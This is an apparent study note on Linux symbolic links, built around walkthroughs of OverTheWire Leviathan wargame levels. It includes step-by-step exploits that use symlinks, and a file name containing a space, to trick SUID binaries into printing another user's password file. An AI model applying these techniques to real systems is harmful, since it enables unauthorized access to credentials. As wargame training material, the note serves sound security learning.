# Symbolic Links

---

## ln -s — Creating a Symbolic Link

```bash
ln -s <target> <link_name>
```

**Symbolic link (symlink):** A shortcut that points to a file or directory from another location. Think of it like a Windows "shortcut" — but much more powerful.

```bash
# Basic usage
ln -s /etc/leviathan_pass/leviathan3 /tmp/mydir/secret

# /tmp/mydir/secret now points to the leviathan3 password
cat /tmp/mydir/secret    # reads the password (if you have the rights)
```

**Recognizing a symbolic link:**
```bash
$ ls -la /tmp/mydir/
lrwxrwxrwx 1 user user 35 ... secret -> /etc/leviathan_pass/leviathan3
^                                     ^^
l → symbolic link                     -> shows the target
```

---

## readlink — Finding the Link Target

```bash
readlink <link>
readlink -f <link>    # resolve the whole chain, give the absolute path
```

```bash
$ readlink /tmp/mydir/secret
/etc/leviathan_pass/leviathan3

$ readlink -f ./secret
/etc/leviathan_pass/leviathan3
```

---

## Fooling a Binary with Symbolic Links

If a SUID binary reads a fixed file path, you can place a symbolic link at that path to make the binary read the file you want.

**Leviathan Level 5 example:**

```bash
# The binary reads /tmp/file.log (detected with ltrace)
$ ltrace ./leviathan5
fopen("/tmp/file.log", "r") = 0    ← file does not exist

# Link /tmp/file.log to the password file
$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

# The binary now reads the password
$ ./leviathan5
<password appears here>
```

---

## Bypassing the access() Check — Space-Based Argument Splitting (Leviathan Level 2)

> **Note:** This level is often mistakenly called "TOCTOU". In reality there is **no time race** here. The bug is that `access()` and `system()` **interpret the same string differently**. The symlink is used only to redirect the part that `cat` reads to the password file.

`printfile` checks a file with `access()` and prints it with `system("/bin/cat " + argv[1])`:

```bash
$ ltrace ./printfile .bashrc
access(".bashrc", 4)                    ← 1. CHECK: looks at the WHOLE string as one path
snprintf("/bin/cat .bashrc", 511, ...)
system("/bin/cat .bashrc")              ← 2. USE: /bin/sh SPLITS the string on spaces
```

- `access()` sees argv[1] as **one whole path** → passes on the real file we created.
- `system()` → `/bin/sh` **splits the string on spaces** → passes multiple arguments to `cat`.

> Why isn't a plain symlink enough? `access()` follows the symlink with the **real uid (leviathan2)**; since leviathan2 cannot read the password file, `access()` on a direct symlink fails. So we pass the access check with a real readable file, and put the symlink only on the part `cat` reads (effective uid = leviathan3).

**Exploit:**

```bash
# 1. Create a temporary directory
mktemp -d    # → /tmp/tmp.BykcxJXZxD

# 2. Create a file whose name contains a space
touch "/tmp/tmp.BykcxJXZxD/test file.txt"

# 3. Put a symlink named "test" to the password file
ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.BykcxJXZxD/test

# 4. Make the directory accessible to everyone
chmod 777 /tmp/tmp.BykcxJXZxD

# 5. Run the binary with "test file.txt"
./printfile "/tmp/tmp.BykcxJXZxD/test file.txt"
```

What happens:
```
access("/tmp/tmp.BykcxJXZxD/test file.txt")  → file exists ✓  (check passes)
system("/bin/cat /tmp/tmp.BykcxJXZxD/test file.txt")
         → cat /tmp/tmp.BykcxJXZxD/test      ← symlink → reads the password ✓
         → cat file.txt                       ← missing, error (doesn't matter)
```

**The real TOCTOU difference:** In a real TOCTOU bug, the file is swapped (e.g. via a symlink) *in the time window between* `access()` and `open()` — i.e. what's exploited is **timing**. In Leviathan 2 it's not timing but the **different parsing of the string**. The lesson is the same: applying `access()` and the following operation to different interpretations (even of the same string) is dangerous; modern code prefers `open()` + error handling over `access()`.

---

## Summary

| Command | What it does |
|---|---|
| `ln -s target link` | Creates a symbolic link pointing to the target |
| `readlink link` | Shows the link's target |
| `readlink -f link` | Resolves the whole chain to an absolute path |
| `ls -la` | Lines starting with `l` are symbolic links |
